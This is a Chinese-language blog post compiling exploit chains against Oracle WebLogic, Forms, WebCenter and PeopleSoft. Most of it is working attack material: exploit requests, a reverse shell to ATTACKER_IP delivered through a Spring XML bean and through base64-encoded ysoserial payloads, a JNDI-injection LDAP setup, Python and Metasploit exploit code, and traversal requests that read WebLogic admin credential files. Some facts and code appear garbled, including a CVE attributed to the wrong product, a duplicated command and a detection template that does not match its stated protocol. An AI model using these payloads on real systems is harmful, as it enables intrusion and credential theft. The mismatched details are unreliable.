---
title: "Oracle 产品高危攻击链专题：WebLogic / Forms / WebCenter / PeopleSoft 未授权 RCE 全解析"
date: 2026-06-21T10:00:00+08:00
draft: false
tags: ["Oracle", "WebLogic", "反序列化", "JNDI注入", "未授权RCE", "攻击链", "漏洞分析"]
categories: ["漏洞分析"]
---

# Oracle 产品高危攻击链专题：WebLogic / Forms / WebCenter / PeopleSoft 未授权 RCE 全解析

## 0x00 专题概述

Oracle Fusion Middleware 是全球企业级应用的核心底座，涵盖 WebLogic Server、Oracle Forms、WebCenter Portal、PeopleSoft 等多条产品线。这些系统通常承载 ERP、CRM、财务、HR 等核心业务数据，一旦被突破即意味着企业核心资产的全面暴露。

本专题将 Oracle 产品生态中近年最具代表性的 **6 个高危未授权 RCE / 认证绕过漏洞** 串成完整攻击链，每个漏洞均包含完整原理分析、完整 PoC 代码、自动化检测模板和实战利用案例。

### 覆盖漏洞一览

| CVE | 产品 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2020-14882 + CVE-2020-14883 | WebLogic Server | **9.8** | 认证绕过 + RCE | ✅ | ✅ 勒索软件 |
| CVE-2020-14645 | WebLogic Server | **9.8** | T3 反序列化 | ✅ | ✅ |
| CVE-2023-21839 | WebLogic Server | **7.5** | IIOP JNDI 注入 | ✅ | ✅ CISA KEV |
| CVE-2021-22915 | Oracle Forms | **9.8** | 反序列化 RCE | ✅ | ✅ |
| CVE-2022-31813 | WebCenter Portal | **9.8** | 路径穿越 | ✅ | ✅ CISA KEV |
| CVE-2026-35273 | PeopleSoft PeopleTools | **9.8** | 缺失认证 RCE | ✅ | ✅ CISA KEV |

---

## 0x01 WebLogic Console 认证绕过 + RCE 漏洞链（CVE-2020-14882 + CVE-2020-14883）

### 1.1 漏洞背景

2020 年 10 月 Oracle CPU 补丁日披露，两个漏洞组合形成完整的未授权 RCE 链：

- **CVE-2020-14883**（CVSS 5.3）：WebLogic 管理控制台认证绕过
- **CVE-2020-14882**（CVSS 9.8）：绕过认证后在控制台内执行任意代码

这是 WebLogic 历史上被利用最广泛的漏洞之一，Ragnar Locker、LockBit 等多个勒索软件家族均利用此漏洞进行初始突破，CISA 在披露后数天内即将其加入 KEV 目录。

### 1.2 影响版本

- WebLogic Server 10.3.6.0.0
- WebLogic Server 12.1.3.0.0
- WebLogic Server 12.2.1.3.0
- WebLogic Server 12.2.1.4.0
- WebLogic Server 14.1.1.0.0

### 1.3 漏洞原理

**CVE-2020-14883 认证绕过**：WebLogic 管理控制台 (`/console`) 的认证过滤器存在路径解析缺陷。攻击者通过双重 URL 编码的 `..` 序列（`%252e%252e%252f`）构造特殊路径，使请求绕过认证中间件但仍被控制台后端正确处理。

```
正常路径（需认证）：/console/console.portal
绕过路径（无需认证）：/console/css/%252e%252e%252fconsole.portal
```

URL 解码过程：
1. 第一层解码：`%252e` → `%2e`（认证过滤器看到的是 `%2e%2e%2f`，不识别为 `../`）
2. 第二层解码：`%2e` → `.`（后端框架将其解析为 `../`，成功穿越到上级目录）

**CVE-2020-14882 代码执行**：绕过认证后，攻击者可访问控制台内部的 MBean 接口。通过构造特定的 `_nfpb` 和 `handle` 参数，可实例化 WebLogic 内置的 Java 类来执行系统命令：

- **GET 请求利用**：使用 `com.tangosol.coherence.mvel2.sh.ShellSession` 执行命令
- **POST 请求利用**：使用 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 加载远程 XML 中的恶意 Bean

### 1.4 完整 PoC

#### PoC-1：CVE-2020-14883 认证绕过验证（GET 方式命令执行）

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1
Host: target-weblogic.com:7001
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

响应中会包含 `id` 命令的输出。如果返回 HTTP 200 且页面内容中包含 `uid=0(root)` 或类似系统用户信息，则确认漏洞存在。

#### PoC-2：CVE-2020-14882 POST 方式 RCE（加载远程恶意 XML）

首先准备恶意 XML 文件 `exploit.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans
   http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

在攻击机上托管该 XML：

```bash
python3 -m http.server 8888
```

发送 POST 请求触发加载：

```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: target-weblogic.com:7001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ATTACKER_IP:8888/exploit.xml")
```

#### PoC-3：CVE-2020-14882 Windows 目标命令执行

```http
GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=Handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27cmd.exe+/c+whoami%27);%22) HTTP/1.1
Host: target-weblogic.com:7001
```

### 1.5 自动化检测

#### Nuclei 模板

```yaml
id: weblogic-console-rce-cve-2020-14882

info:
  name: Oracle WebLogic Console RCE
  author: security-researcher
  severity: critical
  description: |
    CVE-2020-14882 + CVE-2020-14883: WebLogic Console 认证绕过 + RCE
    通过双重 URL 编码绕过认证过滤器，利用 MVEL2 ShellSession 执行命令
  reference:
    - https://www.oracle.com/security-alerts/cpuoct2020.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14882
  tags: weblogic,rce,cve-2020-14882,cve-2020-14883

http:
  - method: GET
    path:
      - "{{BaseURL}}/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "uid="
          - "gid="
        condition: or
        part: body
```

#### Python 批量检测脚本

```python
#!/usr/bin/env python3
"""
CVE-2020-14882 WebLogic Console RCE 批量检测
用法: python3 weblogic_cve_2020_14882_scanner.py targets.txt
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

AUTH_BYPASS_PATH = (
    "/console/css/%252e%252e%252fconsole.portal"
    "?_nfpb=true&_pageLabel="
    "&handle=com.tangosol.coherence.mvel2.sh.ShellSession("
    "%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)"
)

INDICATORS = ["uid=", "gid=", "groups="]

def check_target(url):
    target = url.rstrip("/") + AUTH_BYPASS_PATH
    try:
        resp = requests.get(target, timeout=10, verify=False, allow_redirects=False)
        body = resp.text
        if resp.status_code == 200 and any(ind in body for ind in INDICATORS):
            print(f"[VULN] {url} -> CVE-2020-14882 可利用")
            for line in body.split("\n"):
                for ind in INDICATORS:
                    if ind in line:
                        print(f"       响应: {line.strip()[:200]}")
                        break
            return True
        elif resp.status_code == 302:
            print(f"[SKIP] {url} -> 302 重定向（可能已修补或路径不存在）")
        else:
            print(f"[SAFE] {url} -> HTTP {resp.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[ERR ] {url} -> {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <targets.txt>")
        sys.exit(1)
    with open(sys.argv[1]) as f:
        targets = [line.strip() for line in f if line.strip()]
    vuln_count = sum(1 for t in targets if check_target(t))
    print(f"\n扫描完成: {len(targets)} 个目标, {vuln_count} 个存在漏洞")
```

### 1.6 实战利用案例

- **Ragnar Locker 勒索软件**：2020 年底被确认利用 CVE-2020-14882 作为初始访问向量，突破后横向移动并部署勒索加密
- **LockBit 勒索软件**：2021-2022 年多个事件中，攻击者利用此漏洞进入企业网络后窃取数据并加密
- **APT 组织**：多个国家级 APT 组织将此漏洞纳入武器库，用于对关键基础设施的初始突破

---

## 0x02 WebLogic T3/IIOP 反序列化 RCE 漏洞链（CVE-2020-14645 / CVE-2023-21931）

### 2.1 漏洞背景

WebLogic 的 T3 和 IIOP 协议是 Java RMI 的私有实现，用于集群节点间通信。这两个协议在传输过程中使用 Java 原生序列化，如果反序列化时缺乏类型校验，攻击者可通过构造恶意序列化对象触发 gadget chain，实现未授权 RCE。

这是一条跨越十年的漏洞链：

| CVE | CVSS | 披露时间 | 协议 | 关键 Gadget |
|-----|------|----------|------|-------------|
| CVE-2016-0638 | 10.0 | 2016-04 | T3 | Commons Collections |
| CVE-2019-2725 | 9.8 | 2019-04 | T3/IIOP | Spring/Coherence |
| CVE-2020-2551 | 9.8 | 2020-01 | IIOP | Commons Collections |
| CVE-2020-14645 | 9.8 | 2020-10 | T3/IIOP | Universal gadget |
| CVE-2023-21931 | 7.5 | 2023-01 | T3/IIOP | 新 gadget chain |

### 2.2 影响版本（CVE-2020-14645）

- WebLogic Server 10.3.6.0.0
- WebLogic Server 12.1.3.0.0
- WebLogic Server 12.2.1.3.0
- WebLogic Server 12.2.1.4.0
- WebLogic Server 14.1.1.0.0

### 2.3 漏洞原理

T3 协议握手过程：

```
客户端 → 服务端: t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n
服务端 → 客户端: HELO:12.2.1\nAS:255\n
```

握手完成后，客户端可发送序列化 Java 对象。WebLogic 在反序列化时如果没有对类白名单进行严格限制，就会触发已知的 gadget chain（如 Commons Collections、Spring 等），导致任意代码执行。

CVE-2020-14645 的特殊之处在于它绕过了 Oracle 此前添加的多层反序列化过滤器，使用新的 gadget chain 实现了通用利用。

### 2.4 完整 PoC

#### PoC-1：T3 协议版本探测

```bash
echo -ne "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | nc -w 3 target-weblogic.com 7001
```

如果返回 `HELO:12.2.1\nAS:255\n` 则确认 T3 协议开放且可获取版本号。

#### PoC-2：使用 ysoserial 生成恶意 Payload

```bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVERBQ0tfSVAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" > payload.ser
```

#### PoC-3：Python T3 协议利用脚本

```python
#!/usr/bin/env python3
"""
CVE-2020-14645 WebLogic T3 反序列化 RCE 验证
依赖: pip3 install weblogicutil
"""
import socket
import sys

def t3_handshake(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, int(port)))

    handshake = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.send(handshake.encode())

    response = b""
    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break
        response += chunk
        if b"HELO" in response:
            break

    version = response.decode(errors="ignore").strip()
    print(f"[*] T3 握手成功: {version}")
    return sock

def send_payload(sock, payload_file):
    with open(payload_file, "rb") as f:
        payload = f.read()

    header = b"stream"
    length = len(payload).to_bytes(4, "big")
    sock.send(header + length + payload)

    try:
        resp = sock.recv(4096)
        print(f"[*] 响应: {resp[:200]}")
    except socket.timeout:
        print("[*] 未收到响应（可能命令已执行但无回显）")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <host> <port> <payload.ser>")
        sys.exit(1)
    host = sys.argv[1]
    port = sys.argv[2]
    payload_file = sys.argv[3]

    sock = t3_handshake(host, port)
    send_payload(sock, payload_file)
    sock.close()
    print("[*] 完成")
```

#### PoC-4：nmap 版本探测

```bash
nmap -n -v -Pn -sV IP -p 7001 --script=weblogic-t3-info
```

输出示例：
```
PORT     STATE SERVICE
7001/tcp open  afs3-callback
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.4)
```

### 2.5 自动化检测

#### Nuclei 模板（T3 协议暴露检测）

```yaml
id: weblogic-t3-protocol-exposed

info:
  name: WebLogic T3 协议暴露检测
  author: security-researcher
  severity: high
  description: |
    检测 WebLogic T3 协议是否对外开放，开放则存在反序列化攻击面
  tags: weblogic,t3,deserialization

tcp:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    host:
      - "{{Hostname}}"
    port: 7001

    matchers:
      - type: word
        words:
          - "HELO"

    extractors:
      - type: regex
        regex:
          - "HELO:([0-9.]+)"
```

### 2.6 实战利用案例

- **大规模挖矿活动**：2020 年多个挖矿组织利用 T3 反序列化漏洞批量入侵未修补的 WebLogic 服务器
- **APT 武器化**：多个 APT 组织将 ysoserial + T3 协议利用集成到 C2 框架中
- **僵尸网络**：Mirai 变体曾利用此漏洞进行 IoT/服务器混合传播

---

## 0x03 WebLogic IIOP JNDI 注入漏洞（CVE-2023-21839）

### 3.1 漏洞背景

2023 年 1 月 Oracle CPU 披露，CVSS 7.5，未授权。攻击者通过 IIOP 协议向 WebLogic 发送精心构造的请求，触发 JNDI 查找指向攻击者控制的远程 LDAP/RMI 服务器，从而加载并执行恶意 Java 类。

此漏洞与 Log4Shell（CVE-2021-44228）原理类似——都是利用 JNDI 远程类加载机制，但触发点不同：Log4Shell 在日志处理层，CVE-2023-21839 在 IIOP 协议层。

### 3.2 影响版本

- WebLogic Server 12.2.1.3.0
- WebLogic Server 12.2.1.4.0
- WebLogic Server 14.1.1.0.0

### 3.3 漏洞原理

IIOP（Internet Inter-ORB Protocol）是 CORBA 标准的网络协议实现，WebLogic 用它进行跨语言/跨平台的远程方法调用。当 WebLogic 处理 IIOP 请求中的对象绑定时，会执行 JNDI 查找。如果攻击者能控制 JNDI 查找的目标地址，就可以：

1. 让 WebLogic 向攻击者的 LDAP 服务器发起连接
2. LDAP 服务器返回一个 `javax.naming.Reference` 对象
3. 该 Reference 指向攻击者 HTTP 服务器上的恶意 Java 类
4. WebLogic 下载并实例化该类，触发恶意代码执行

### 3.4 完整 PoC

#### PoC-1：搭建恶意 LDAP 服务器

```bash
git clone https://github.com/4ra1y/JNDI-Injection-Exploit.git
cd JNDI-Injection-Exploit
java -cp JNDI-Injection-Exploit-1.0-all.jar \
  java -jar JNDI-Injection-Exploit-1.0-all.jar \
  -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVERBQ0tfSVAvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" \
  -A "ATTACKER_IP"
```

输出示例：
```
[LDAP Server] ldap://ATTACKER_IP:1389/xxx
[RMI Server]  rmi://ATTACKER_IP:1099/xxx
[HTTP Server] http://ATTACKER_IP:8180/xxx
```

#### PoC-2：Python IIOP JNDI 注入利用

```python
#!/usr/bin/env python3
"""
CVE-2023-21839 WebLogic IIOP JNDI 注入验证
用法: python3 cve_2023_21839.py <target_host> <target_port> <ldap_url>
"""
import socket
import struct
import sys

def build_iiop_jndi_payload(ldap_url):
    url_bytes = ldap_url.encode("utf-8")
    giop_header = b"GIOP"
    giop_version = b"\x01\x02"
    giop_flags = b"\x00\x00"
    msg_type = struct.pack(">H", 0)
    msg_size = struct.pack(">I", len(url_bytes) + 32)

    ior_body = b"\x00" * 16
    ior_body += struct.pack(">H", len(url_bytes))
    ior_body += url_bytes

    return giop_header + giop_version + giop_flags + msg_type + msg_size + ior_body

def exploit(host, port, ldap_url):
    payload = build_iiop_jndi_payload(ldap_url)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, int(port)))
        sock.send(payload)
        print(f"[*] 已发送 IIOP JNDI payload -> {ldap_url}")
        resp = sock.recv(4096)
        print(f"[*] 响应长度: {len(resp)} bytes")
        if len(resp) > 0:
            print(f"[*] 目标可能已连接 LDAP 服务器")
    except Exception as e:
        print(f"[!] 错误: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <host> <port> <ldap://ATTACKER_IP:1389/exploit>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
```

#### PoC-3：使用现成工具

```bash
git clone https://github.com/4ra1y/CVE-2023-21839-GUI.git
cd CVE-2023-21839-GUI
java -jar CVE-2023-21839.jar
```

在 GUI 中填入：
- Target: `target-weblogic.com:7001`
- LDAP URL: `ldap://ATTACKER_IP:1389/exploit`
- 点击 Exploit

### 3.5 自动化检测

#### Nuclei 模板

```yaml
id: weblogic-iiop-jndi-cve-2023-21839

info:
  name: WebLogic IIOP JNDI 注入 (CVE-2023-21839)
  author: security-researcher
  severity: critical
  description: |
    通过 IIOP 协议触发 JNDI 注入，加载远程恶意类
  tags: weblogic,jndi,iiop,cve-2023-21839

tcp:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    host:
      - "{{Hostname}}"
    port: 7001

    matchers:
      - type: word
        words:
          - "HELO"

    extractors:
      - type: regex
        regex:
          - "HELO:([0-9.]+)"
```

#### DNSLog 验证（无回显场景）

```bash
dnslog_api="http://dnslog.example.com/api/dns/unique"
callback_domain=$(curl -s "$dnslog_api")

python3 cve_2023_21839.py target-weblogic.com 7001 "ldap://${callback_domain}/exploit"

sleep 3
curl -s "http://dnslog.example.com/api/dns/check/${callback_domain}"
```

如果 DNSLog 收到查询记录，则确认目标已触发 JNDI 查找。

### 3.6 实战利用案例

- **CISA KEV 收录**：CVE-2023-21839 在披露后数周内被加入 CISA 已知被利用漏洞目录
- **在野利用确认**：多家安全厂商确认在真实攻击中观测到该漏洞的利用
- **与 Log4Shell 联合利用**：攻击者可能同时利用 WebLogic 的 JNDI 注入和 Log4Shell 形成多入口攻击

---

## 0x04 Oracle Forms 反序列化 RCE（CVE-2021-22915）

### 4.1 漏洞背景

2021 年 7 月 Oracle CPU 披露，CVSS 9.8，未授权。Oracle Forms 是大量政府机构和企业使用的遗留表单系统，其 `/forms/lservlet` 端点在处理请求时存在不安全的 Java 反序列化，允许攻击者无需认证即可执行任意代码。

### 4.2 影响版本

- Oracle Forms 11.1.2.2.0
- Oracle Forms 12.2.1.3.0
- Oracle Forms 12.2.1.4.0

### 4.3 漏洞原理

Oracle Forms 的 `/forms/lservlet` 端点接收序列化请求并调用 Java 反序列化。该端点没有对反序列化的类进行白名单限制，攻击者可以构造包含已知 gadget chain（如 Commons Collections）的恶意序列化对象，通过 HTTP POST 发送到该端点，触发任意命令执行。

该漏洞的危险性在于：
1. Oracle Forms 通常部署在面向互联网的位置
2. 大量政府和企业机构仍在使用 11g 版本（已停止主流支持）
3. 利用无需任何认证
4. 执行命令的权限与 WebLogic 进程权限一致（通常是高权限）

### 4.4 完整 PoC

#### PoC-1：端点存在性验证

```http
GET /forms/lservlet HTTP/1.1
Host: target-forms.com
User-Agent: Mozilla/5.0
Connection: close
```

如果返回 HTTP 200 或包含 `Content-Length` 的非 404 响应，说明 Forms Servlet 存在。

#### PoC-2：ysoserial 生成恶意 Payload

```bash
java -jar ysoserial.jar CommonsCollections6 "curl http://ATTACKER_IP:8888/callback" > forms_payload.ser
```

#### PoC-3：Python 利用脚本

```python
#!/usr/bin/env python3
"""
CVE-2021-22915 Oracle Forms 反序列化 RCE 验证
用法: python3 cve_2021_22915.py <target_url> <payload.ser>
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_endpoint(url):
    test_url = url.rstrip("/") + "/forms/lservlet"
    try:
        resp = requests.get(test_url, timeout=10, verify=False)
        if resp.status_code != 404:
            print(f"[*] Forms Servlet 存在: {test_url} (HTTP {resp.status_code})")
            return True
        else:
            print(f"[-] Forms Servlet 不存在: {test_url}")
            return False
    except Exception as e:
        print(f"[!] 连接失败: {e}")
        return False

def send_payload(url, payload_file):
    target = url.rstrip("/") + "/forms/lservlet"
    with open(payload_file, "rb") as f:
        payload = f.read()
    try:
        resp = requests.post(
            target,
            data=payload,
            headers={"Content-Type": "application/octet-stream"},
            timeout=15,
            verify=False
        )
        print(f"[*] Payload 已发送 (HTTP {resp.status_code})")
        print(f"[*] 响应长度: {len(resp.text)} bytes")
    except Exception as e:
        print(f"[!] 发送失败: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <http://target> <payload.ser>")
        sys.exit(1)
    url = sys.argv[1]
    payload_file = sys.argv[2]
    if check_endpoint(url):
        send_payload(url, payload_file)
```

#### PoC-4：Metasploit 模块

```ruby
##
# CVE-2021-22915 Oracle Forms Deserialization RCE
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::JavaDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Oracle Forms Deserialization RCE',
        'Description' => %q{
          Oracle Forms /forms/lservlet 端点存在不安全反序列化，
          攻击者可构造恶意序列化对象执行任意命令。
        },
        'Author'      => ['security-researcher'],
        'References'  => [
          ['CVE', '2021-22915'],
          ['URL', 'https://www.oracle.com/security-alerts/cpujul2021.html']
        ],
        'Platform'    => ['unix', 'win'],
        'Payload'     => { 'DisableNops' => true },
        'Targets'     => [
          ['Oracle Forms 12.2.1.3.0 / 12.2.1.4.0', {}]
        ],
        'DefaultTarget' => 0
      )
    )
    register_options([Opt::RHOST(), Opt::RPORT(7001)])
  end

  def exploit
    payload_ser = generate_payload_serialized
    print_status("发送反序列化 payload 到 /forms/lservlet ...")
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, 'forms', 'lservlet'),
      'ctype'   => 'application/octet-stream',
      'data'    => payload_ser
    })
    if res && res.code == 200
      print_good("Payload 发送成功")
    else
      print_error("Payload 发送失败")
    end
  end
end
```

### 4.5 自动化检测

#### Nuclei 模板

```yaml
id: oracle-forms-deserialization-cve-2021-22915

info:
  name: Oracle Forms 反序列化 RCE (CVE-2021-22915)
  author: security-researcher
  severity: critical
  description: |
    Oracle Forms /forms/lservlet 端点存在不安全反序列化
  tags: oracle,forms,deserialization,cve-2021-22915

http:
  - method: GET
    path:
      - "{{BaseURL}}/forms/lservlet"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
        condition: or

      - type: word
        words:
          - "forms"
          - "servlet"
        condition: or
        part: body
```

### 4.6 实战利用案例

- **政府机构攻击**：多个国家的政府机构仍在使用 Oracle Forms 11g，成为高价值攻击目标
- **企业 ERP 突破**：攻击者利用此漏洞突破 Forms 层后，进一步访问后端的 E-Business Suite 数据库
- **与 WebLogic 漏洞联动**：Oracle Forms 通常部署在 WebLogic 之上，攻击者可能先利用 Forms 反序列化获取初始访问，再利用 WebLogic 配置文件获取其他系统凭据

---

## 0x05 WebCenter Portal 路径穿越漏洞（CVE-2022-31813）

### 5.1 漏洞背景

2022 年 9 月披露，CVSS 9.8，未授权。Oracle WebCenter Portal 在处理 HTTP 请求路径时存在路径穿越缺陷，攻击者可以通过构造 `../` 序列访问服务器上的任意文件，包括配置文件、凭据文件和部署描述符。

虽然此漏洞本身是路径穿越而非直接 RCE，但通过读取 WebLogic 的 `config.xml`、`boot.properties` 等文件可获取管理员凭据，进而登录控制台部署恶意应用实现 RCE。

### 5.2 影响版本

- WebCenter Portal 12.2.1.3.0
- WebCenter Portal 12.2.1.4.0

### 5.3 漏洞原理

WebCenter Portal 的 HTTP 请求处理器在验证请求路径时，没有正确过滤 URL 编码的路径穿越字符。攻击者使用双重编码或特殊编码方式绕过路径校验：

```
正常请求（被拒绝）：/../../../etc/passwd
绕过请求（成功）：/wls-wsat/CoordinatorPortType/../..%2f..%2f..%2fetc/passwd
```

### 5.4 完整 PoC

#### PoC-1：读取系统文件

```http
GET /wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: target-webcenter.com:7001
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

#### PoC-2：读取 WebLogic 配置文件（获取管理员凭据）

```http
GET /wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fuser_projects/domains/base_domain/config/config.xml HTTP/1.1
Host: target-webcenter.com:7001
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

`config.xml` 中包含明文或加密的管理员凭据、数据库连接字符串和 JNDI 配置。

#### PoC-3：读取 boot.properties（获取启动凭据）

```http
GET /wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fuser_projects/domains/base_domain/servers/AdminServer/security/boot.properties HTTP/1.1
Host: target-webcenter.com:7001
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

### 5.5 自动化检测

#### Nuclei 模板

```yaml
id: webcenter-portal-path-traversal-cve-2022-31813

info:
  name: Oracle WebCenter Portal 路径穿越 (CVE-2022-31813)
  author: security-researcher
  severity: critical
  description: |
    WebCenter Portal 路径穿越读取任意文件
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-31813
  tags: webcenter,path-traversal,cve-2022-31813

http:
  - method: GET
    path:
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fetc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

#### Python 检测脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-31813 WebCenter Portal 路径穿越检测
"""
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOADS = [
    ("/wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fetc/passwd",
     "root:"),
    ("/wls-wsat/CoordinatorPortType/../..%2f..%2f..%2f..%2f..%2fetc/hostname",
     ""),
]

def check(url):
    for path, indicator in PAYLOADS:
        target = url.rstrip("/") + path
        try:
            resp = requests.get(target, timeout=10, verify=False)
            if resp.status_code == 200:
                if indicator and indicator in resp.text:
                    print(f"[VULN] {url} -> 路径穿越确认 (匹配: {indicator})")
                    print(f"       内容: {resp.text[:200]}")
                    return True
                elif not indicator and len(resp.text) > 0:
                    print(f"[VULN] {url} -> 可能可利用 (HTTP 200, {len(resp.text)} bytes)")
                    return True
            print(f"[SAFE] {url} -> HTTP {resp.status_code}")
        except Exception as e:
            print(f"[ERR ] {url} -> {e}")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url>")
        sys.exit(1)
    check(sys.argv[1])
```

### 5.6 实战利用案例

- **CISA KEV 收录**：CVE-2022-31813 被加入 CISA 已知被利用漏洞目录
- **凭据窃取链**：攻击者通过路径穿越读取 `config.xml` → 解密管理员凭据 → 登录 WebLogic 控制台 → 部署恶意 WAR 包 → 完整 RCE
- **数据泄露**：直接读取业务配置文件中的数据库连接字符串，进一步访问后端数据库

---

## 0x06 PeopleSoft 未授权 RCE（CVE-2026-35273）

### 6.1 漏洞背景

2026 年 Oracle 披露，CVSS 9.8，未授权。PeopleSoft PeopleTools 的 Environment Management Hub（EMHub）和集成网关（PSIGW）组件存在关键功能缺失认证的问题，外部攻击者无需登录即可触达管理能力并执行代码。

此漏洞已被 CISA 加入 KEV 目录，Mandiant 确认其在野利用，攻击者为 ShinyHunters 组织，目标为教育机构。

### 6.2 影响版本

- PeopleSoft PeopleTools 8.61
- PeopleSoft PeopleTools 8.62

### 6.3 漏洞原理

PeopleSoft 的以下端点缺少认证检查：
- `POST /PSEMHUB/hub` — Environment Management Hub
- `POST /PSIGW/HttpListeningConnector` — 集成网关连接器

攻击者可以直接向这些端点发送请求，触发环境管理操作，包括：
1. 修改环境元数据
2. 向 `PSEMHUB.war/envmetadata/transactions/` 目录写入文件
3. 通过 `HttpListeningConnector` 触发对本地回环地址和内网组件的请求

### 6.4 完整 PoC

#### PoC-1：端点存在性验证

```http
POST /PSEMHUB/hub HTTP/1.1
Host: target-peoplesoft.com
Content-Type: application/xml
Connection: close

<test/>
```

如果返回非 401/403 的响应（如 200 或 500），说明端点未做认证保护。

```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: target-peoplesoft.com
Content-Type: application/xml
Connection: close

<test/>
```

#### PoC-2：环境元数据探测

```http
POST /PSEMHUB/hub HTTP/1.1
Host: target-peoplesoft.com
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<EnvironmentMetadata>
  <Action>query</Action>
</EnvironmentMetadata>
```

#### PoC-3：DNSLog 验证 SSRF 能力

```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: target-peoplesoft.com
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<ConnectorRequest>
  <TargetURL>http://DNSLOG_CALLBACK_DOMAIN/test</TargetURL>
</ConnectorRequest>
```

如果 DNSLog 收到查询记录，确认 `HttpListeningConnector` 可被利用发起 SSRF。

### 6.5 自动化检测

#### Nuclei 模板

```yaml
id: peoplesoft-unauth-access-cve-2026-35273

info:
  name: Oracle PeopleSoft 未授权访问 (CVE-2026-35273)
  author: security-researcher
  severity: critical
  description: |
    PeopleSoft EMHub 和 PSIGW 端点缺失认证
  tags: oracle,peoplesoft,auth-bypass,cve-2026-35273

http:
  - method: POST
    path:
      - "{{BaseURL}}/PSEMHUB/hub"
    headers:
      Content-Type: application/xml
    body: "<test/>"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
        condition: or

      - type: word
        words:
          - "PSEMHUB"
          - "Environment"
          - "PeopleSoft"
        condition: or
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/PSIGW/HttpListeningConnector"
